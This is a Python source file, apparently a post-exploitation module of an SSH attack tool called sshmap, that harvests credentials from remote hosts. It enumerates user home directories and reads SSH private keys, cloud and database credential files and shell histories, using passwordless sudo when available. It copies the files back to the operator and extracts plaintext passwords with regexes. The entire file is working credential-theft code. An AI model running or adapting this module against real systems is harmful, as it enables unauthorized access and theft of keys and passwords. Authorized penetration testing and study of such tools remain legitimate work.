"""Module for harvesting credentials from various sources on the remote host."""
import os
import re
import shlex
from typing import Dict, Any, List
from modules.post_exploitation.base_module import BasePostExploitationModule
from modules.logger import sshmap_logger
from modules.utils import sanitize_filename_component


class CredentialHarvesterModule(BasePostExploitationModule):
    """
    Harvests credentials from common locations on the remote host.
    
    Searches for credentials in:
    - Shell history files (.bash_history, .zsh_history, etc.)
    - SSH configuration and keys
    - Configuration files (.netrc, .my.cnf, etc.)
    - Environment files
    """
    
    # Maximum file size to read (50KB)
    MAX_FILE_SIZE = 50000
    
    @property
    def name(self) -> str:
        return "credential_harvester"
    
    @property
    def description(self) -> str:
        return "Harvest credentials from history, config files, and user home directory"
    
    async def execute(self, ssh_session, output_dir: str) -> Dict[str, Any]:
        """Execute credential harvesting on the remote host."""
        try:
            hostname = ssh_session.get_remote_hostname()
            safe_hostname = sanitize_filename_component(hostname)
            sshmap_logger.info(f"[{self.name}] Starting credential harvesting on {hostname}")

            # Safety/behavior notes:
            # - By default this module only inspects files in the current user's $HOME.
            # - It does NOT attempt privilege escalation or use sudo to read other users' files.
            # - Optional: if SSHMAP_CREDHARVEST_ALL_HOMES=1 is set, it will *enumerate other users' homes*
            #   but will still only read files which are already readable by the current user.
            scan_all_homes_if_readable = os.environ.get("SSHMAP_CREDHARVEST_ALL_HOMES", "").strip() == "1"
            sshmap_logger.display(f"[{self.name}] Scan all user homes if readable: {'enabled' if scan_all_homes_if_readable else 'disabled'}")
            
            results = {
                "success": True,
                "hostname": hostname,
                "data": {
                    "identity": {},
                    "sudo": {"checked": False, "sudo_l": None},
                    "homes_checked": [],
                    "files_checked": [],
                    "history_files": [],
                    "config_files": [],
                    "ssh_keys": [],
                    "credentials_found": [],
                    "extracted_credentials": []
                },
                "error": None
            }

            # Collect basic identity info (helps interpret permissions in reports)
            try:
                results["data"]["identity"]["whoami"] = (await ssh_session.exec_command("whoami")).strip()
                results["data"]["identity"]["id"] = (await ssh_session.exec_command("id")).strip()
                results["data"]["identity"]["home"] = (await ssh_session.exec_command('printf %s "$HOME"')).strip()
            except Exception as e:
                sshmap_logger.debug(f"[{self.name}] Failed to collect identity info: {e}")

            # Record sudo capabilities for auditing (non-interactive; never uses sudo to read files here)
            try:
                results["data"]["sudo"]["checked"] = True
                sudo_l_output = await ssh_session.exec_command(
                    "sudo -n -l 2>&1 || true"
                )
                results["data"]["sudo"]["sudo_l"] = sudo_l_output

                # Save sudo -l output to its own file for the report
                sudo_l_file = os.path.join(output_dir, f"{safe_hostname}_sudo_l.txt")
                with open(sudo_l_file, "w") as f:
                    f.write(f"# sudo -l output\n# Host: {hostname}\n\n")
                    f.write(sudo_l_output)

                # Log a clear summary
                if sudo_l_output.strip():
                    sshmap_logger.display(f"[{self.name}] sudo -l on {hostname}:\n{sudo_l_output.strip()}")
                else:
                    sshmap_logger.display(f"[{self.name}] sudo -l returned no output on {hostname}")
            except Exception as e:
                sshmap_logger.debug(f"[{self.name}] Failed to check sudo capabilities: {e}")
            
            # File globs/paths relative to a user's home directory
            rel_files_to_check = [
                # Shell history files
                ".bash_history",
                ".zsh_history",
                ".sh_history",
                ".history",
                # SSH related
                ".ssh/config",
                ".ssh/id_rsa",
                ".ssh/id_dsa",
                ".ssh/id_ecdsa",
                ".ssh/id_ed25519",
                ".ssh/authorized_keys",
                # Configuration files with potential credentials
                ".netrc",
                ".my.cnf",
                ".pgpass",
                ".aws/credentials",
                ".config/gcloud/credentials.db",
                ".docker/config.json",
                ".git-credentials",
                ".gitconfig",
                # Environment files
                ".bashrc",
                ".zshrc",
                ".profile",
                ".bash_profile",
            ]

            def _join_home(home_dir: str, rel_path: str) -> str:
                home_dir = (home_dir or "").rstrip("/")
                rel_path = rel_path.lstrip("/")
                return f"{home_dir}/{rel_path}" if home_dir else rel_path

            # Build the list of home directories to check
            homes_to_check: List[str] = []
            current_home = results["data"].get("identity", {}).get("home")
            if current_home:
                homes_to_check.append(current_home)

            if scan_all_homes_if_readable:
                try:
                    passwd = await ssh_session.exec_command("getent passwd 2>/dev/null || cat /etc/passwd")
                    for line in passwd.splitlines():
                        if not line or line.startswith("#") or ":" not in line:
                            continue
                        parts = line.split(":")
                        if len(parts) < 6:
                            continue
                        home_dir = parts[5].strip()
                        if not home_dir or home_dir == current_home:
                            continue
                        # Include /root, /home/*, /Users/*, and any other real home dirs
                        # (skip pseudo-homes like /, /bin, /dev/null, /nonexistent, /var/*)
                        skip_dirs = ("/bin", "/sbin", "/usr", "/dev", "/proc",
                                     "/sys", "/tmp", "/var", "/nonexistent", "/run")
                        if home_dir == "/" or any(home_dir.startswith(d) for d in skip_dirs):
                            continue
                        homes_to_check.append(home_dir)
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Failed to enumerate user homes: {e}")

            # De-duplicate while preserving order
            seen = set()
            homes_to_check = [h for h in homes_to_check if not (h in seen or seen.add(h))]
            results["data"]["homes_checked"] = homes_to_check

            # Whether passwordless sudo is available for reading files.
            # We check if sudo -l succeeded (no password prompt) AND that
            # either ALL commands or 'head' specifically are permitted.
            sudo_l_output = results["data"]["sudo"].get("sudo_l") or ""
            _sudo_failed_markers = ("password is required", "sorry, user", "no sudo", "not allowed", "sudo: ")
            _sudo_l_lower = sudo_l_output.lower()
            _sudo_succeeded = bool(sudo_l_output.strip()) and not any(m in _sudo_l_lower for m in _sudo_failed_markers)
            # Detect which read commands are available via passwordless sudo
            _sudo_permits_all  = _sudo_succeeded and "all" in _sudo_l_lower
            _sudo_permits_cat  = _sudo_permits_all or (_sudo_succeeded and ("cat" in _sudo_l_lower))
            _sudo_permits_grep = _sudo_permits_all or (_sudo_succeeded and ("grep" in _sudo_l_lower))
            _sudo_permits_head = _sudo_permits_all or (_sudo_succeeded and ("head" in _sudo_l_lower))
            # Pick the best available sudo read command (cat > head > grep)
            if _sudo_permits_cat:
                _sudo_read_cmd_tpl  = "sudo -n cat {q} 2>/dev/null"
                _sudo_read_label    = "cat"
            elif _sudo_permits_head:
                _sudo_read_cmd_tpl  = f"sudo -n head -c {self.MAX_FILE_SIZE} {{q}} 2>/dev/null"
                _sudo_read_label    = "head"
            elif _sudo_permits_grep:
                _sudo_read_cmd_tpl  = "sudo -n grep -a '' {q} 2>/dev/null"
                _sudo_read_label    = "grep"
            else:
                _sudo_read_cmd_tpl  = None
                _sudo_read_label    = None
            sudo_available = _sudo_read_cmd_tpl is not None
            if sudo_available:
                sshmap_logger.warning(
                    f"[{self.name}] MISCONFIGURATION: passwordless sudo ('{_sudo_read_label}') "
                    f"detected on {hostname} — will use 'sudo {_sudo_read_label}' for all file reads"
                )
            elif _sudo_succeeded:
                sshmap_logger.display(
                    f"[{self.name}] sudo available on {hostname} but no read command "
                    f"(cat/head/grep) permitted — using plain cat"
                )

            # Build the primary read command once.
            # If a passwordless sudo read command is available, use it for ALL reads —
            # this is itself a misconfiguration finding and gives the most complete results.
            # Otherwise fall back to plain cat (truncated via head -c).
            def _build_read_cmd(q: str) -> tuple:
                """Returns (cmd, used_sudo: bool)."""
                if sudo_available:
                    cmd = _sudo_read_cmd_tpl.format(q=q)
                    # For cat/grep, truncate on our side after reading
                    return cmd, True
                return f"cat {q} 2>/dev/null | head -c {self.MAX_FILE_SIZE}", False

            # Helper to test/read/write a file if accessible
            async def _try_harvest_file(abs_path: str):
                if not abs_path:
                    return

                q = shlex.quote(abs_path)
                try:
                    # Track checked paths for reporting
                    results["data"]["files_checked"].append(abs_path)

                    # 1. Check if file exists (using sudo stat if available, else test)
                    if sudo_available:
                        exist_cmd = f"sudo -n test -f {q} 2>/dev/null && echo 'EXISTS' || echo 'NOT_FOUND'"
                    else:
                        exist_cmd = f"test -f {q} && echo 'EXISTS' || echo 'NOT_FOUND'"
                    exist_out = await ssh_session.exec_command(exist_cmd)
                    if "NOT_FOUND" in exist_out:
                        return

                    # 2. Read with the best available command
                    read_cmd, used_sudo = _build_read_cmd(q)
                    content = await ssh_session.exec_command(read_cmd)
                    # Truncate on our side (needed when sudo cat/grep returns full file)
                    content = content[:self.MAX_FILE_SIZE]

                    if not content.strip():
                        return

                    if used_sudo:
                        sshmap_logger.warning(
                            f"[{self.name}] MISCONFIGURATION: sudo ('{_sudo_read_label}') "
                            f"read {abs_path} on {hostname}"
                        )

                    # Save the file
                    safe_filename = abs_path.replace("/", "_").replace("~", "home")
                    output_file = os.path.join(output_dir, f"{safe_hostname}_{safe_filename}")
                    with open(output_file, "w") as f:
                        f.write(f"# File: {abs_path}\n")
                        f.write(f"# Host: {hostname}\n")
                        if used_sudo:
                            f.write("# !! READ VIA SUDO - MISCONFIGURATION FINDING !!\n")
                        f.write("\n")
                        f.write(content)

                    # Categorize
                    entry = abs_path if not used_sudo else f"{abs_path} [via sudo - MISCONFIGURATION]"
                    if "history" in abs_path or abs_path.endswith("/.history"):
                        results["data"]["history_files"].append(entry)
                        extracted = self._extract_credentials_from_history(content)
                        if extracted:
                            # Tag each extracted cred with sudo flag
                            for c in extracted:
                                if used_sudo:
                                    c["via_sudo"] = True
                            results["data"]["extracted_credentials"].extend(extracted)
                            results["data"]["credentials_found"].append(entry)
                    elif "/.ssh/" in abs_path:
                        results["data"]["ssh_keys"].append(entry)
                    else:
                        results["data"]["config_files"].append(entry)

                    sshmap_logger.debug(f"[{self.name}] Found and saved: {abs_path}" + (" (via sudo)" if used_sudo else ""))

                    if self._contains_credentials(content) and entry not in results["data"]["credentials_found"]:
                        results["data"]["credentials_found"].append(entry)
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Error checking {abs_path}: {e}")
                    return
            
            # Harvest files from selected homes
            for home_dir in homes_to_check:
                for rel_path in rel_files_to_check:
                    await _try_harvest_file(_join_home(home_dir, rel_path))
            
            # Summary
            total_files = (len(results["data"]["history_files"]) + 
                          len(results["data"]["config_files"]) + 
                          len(results["data"]["ssh_keys"]))
            
            creds_count = len(results["data"]["extracted_credentials"])
            sshmap_logger.display(
                f"[{self.name}] Harvested {total_files} files from {hostname}. "
                f"Found potential credentials in {len(results['data']['credentials_found'])} files. "
                f"Extracted {creds_count} credentials."
            )
            
            # Save extracted credentials to a separate file
            if results["data"]["extracted_credentials"]:
                creds_file = os.path.join(output_dir, f"{safe_hostname}_extracted_credentials.txt")
                with open(creds_file, "w") as f:
                    f.write(f"# Extracted Credentials from {hostname}\n")
                    f.write(f"# Total: {creds_count}\n\n")
                    for cred in results["data"]["extracted_credentials"]:
                        f.write(f"Type: {cred['type']}\n")
                        f.write(f"Source: {cred['source']}\n")
                        if cred.get("via_sudo"):
                            f.write("!! Via sudo (misconfiguration) !!\n")
                        if 'username' in cred:
                            f.write(f"Username: {cred['username']}\n")
                        if 'password' in cred:
                            f.write(f"Password: {cred['password']}\n")
                        if 'host' in cred:
                            f.write(f"Host: {cred['host']}\n")
                        if 'command' in cred:
                            f.write(f"Command: {cred['command']}\n")
                        f.write("\n" + "-"*60 + "\n\n")
            
            return results
            
        except Exception as e:
            sshmap_logger.error(f"[{self.name}] Failed to harvest credentials: {e}")
            return {
                "success": False,
                "hostname": hostname if 'hostname' in locals() else "unknown",
                "data": None,
                "error": str(e)
            }
    
    def _contains_credentials(self, content: str) -> bool:
        """Check if content contains potential credential patterns."""
        # Simple pattern matching for common credential indicators
        credential_keywords = [
            "password", "passwd", "pwd", "secret", "token", "api_key",
            "apikey", "access_key", "private_key", "auth", "credential"
        ]
        content_lower = content.lower()
        return any(keyword in content_lower for keyword in credential_keywords)
    
    def _extract_credentials_from_history(self, content: str) -> List[Dict[str, str]]:
        """Extract credentials from shell history content."""
        credentials = []
        lines = content.split('\n')
        
        for i, line in enumerate(lines):
            line = line.strip()
            if not line:
                continue
            
            # Extract from sshpass commands
            # Examples: sshpass -p 'password' ssh user@host
            #           sshpass -p password ssh user@host
            sshpass_match = re.search(r'sshpass\s+-p\s+[\'"]?([^\s\'"]+)[\'"]?\s+ssh\s+(?:([^@]+)@)?(\S+)', line)
            if sshpass_match:
                password = sshpass_match.group(1)
                username = sshpass_match.group(2) if sshpass_match.group(2) else None
                host = sshpass_match.group(3)
                credentials.append({
                    'type': 'sshpass',
                    'source': 'history',
                    'password': password,
                    'username': username,
                    'host': host,
                    'command': line
                })
            
            # Extract from mysql/mariadb commands with password
            # Examples: mysql -u root -pPassword123
            #           mysql -u root -p'Password123'
            mysql_match = re.search(r'mysql.*-u\s+(\S+).*-p[\'"]?([^\s\'"]+)', line)
            if mysql_match:
                username = mysql_match.group(1)
                password = mysql_match.group(2)
                credentials.append({
                    'type': 'mysql',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })
            
            # Extract from psql commands with password in URL
            # Example: psql postgresql://user:password@host/db
            psql_match = re.search(r'postgresql://([^:]+):([^@]+)@(\S+)', line)
            if psql_match:
                username = psql_match.group(1)
                password = psql_match.group(2)
                host = psql_match.group(3)
                credentials.append({
                    'type': 'postgresql',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'host': host,
                    'command': line
                })
            
            # Extract from FTP commands
            # Example: ftp ftp://user:password@host
            ftp_match = re.search(r'ftp://([^:]+):([^@]+)@(\S+)', line)
            if ftp_match:
                username = ftp_match.group(1)
                password = ftp_match.group(2)
                host = ftp_match.group(3)
                credentials.append({
                    'type': 'ftp',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'host': host,
                    'command': line
                })
            
            # Check for passwd command - next line might be password
            if re.match(r'^passwd\s*$', line) or re.match(r'^sudo\s+passwd', line):
                if i + 1 < len(lines):
                    next_line = lines[i + 1].strip()
                    # If next line looks like a password (not a command)
                    if next_line and not next_line.startswith('#') and len(next_line) > 2:
                        # Simple heuristic: passwords typically don't start with common command prefixes
                        if not any(next_line.startswith(cmd) for cmd in ['ls', 'cd', 'cat', 'echo', 'sudo', 'su', 'passwd']):
                            credentials.append({
                                'type': 'passwd_followup',
                                'source': 'history',
                                'password': next_line,
                                'command': f"{line} -> {next_line}"
                            })
            
            # Check for sudo commands - next line might be password
            # But only if the next line is short and doesn't look like another command
            if line.startswith('sudo ') and i + 1 < len(lines):
                next_line = lines[i + 1].strip()
                # Password prompts typically result in the password on the next line in history
                if next_line and not next_line.startswith('sudo') and not next_line.startswith('[sudo]'):
                    # Check if it looks like a password (short, no spaces, not a common command)
                    if len(next_line) <= 50 and ' ' not in next_line:
                        if not any(next_line.startswith(cmd) for cmd in ['ls', 'cd', 'cat', 'echo', 'pwd', 'whoami']):
                            credentials.append({
                                'type': 'sudo_followup',
                                'source': 'history',
                                'password': next_line,
                                'command': f"{line} -> {next_line}"
                            })
            
            # Extract passwords from export/set commands
            # Examples: export PASSWORD=secret123
            #           export DB_PASS="secret123"
            export_match = re.search(r'(?:export|set)\s+(\w*(?:PASS|PASSWORD|PWD|SECRET|TOKEN|KEY)\w*)\s*=\s*[\'"]?([^\s\'"]+)', line, re.IGNORECASE)
            if export_match:
                var_name = export_match.group(1)
                value = export_match.group(2)
                credentials.append({
                    'type': 'environment_variable',
                    'source': 'history',
                    'variable': var_name,
                    'password': value,
                    'command': line
                })
            
            # Extract from curl/wget with basic auth
            # Example: curl -u user:password http://example.com
            curl_auth_match = re.search(r'(?:curl|wget).*-u\s+([^:]+):([^\s]+)', line)
            if curl_auth_match:
                username = curl_auth_match.group(1)
                password = curl_auth_match.group(2)
                credentials.append({
                    'type': 'http_basic_auth',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })

            # Extract from chpasswd patterns
            # Examples:
            #   echo root:Temporal01 | chpasswd
            #   echo "admin:P@ssw0rd" | sudo chpasswd
            #   printf 'user:pass\n' | chpasswd
            chpasswd_match = re.search(
                r'(?:echo|printf)\s+[\'"]?([^:\s\'"]+):([^\s\|\'"\n]+)[\'"]?\s*\|.*chpasswd',
                line
            )
            if chpasswd_match:
                username = chpasswd_match.group(1)
                password = chpasswd_match.group(2).rstrip("'\"")
                credentials.append({
                    'type': 'chpasswd',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })
        
        return credentials
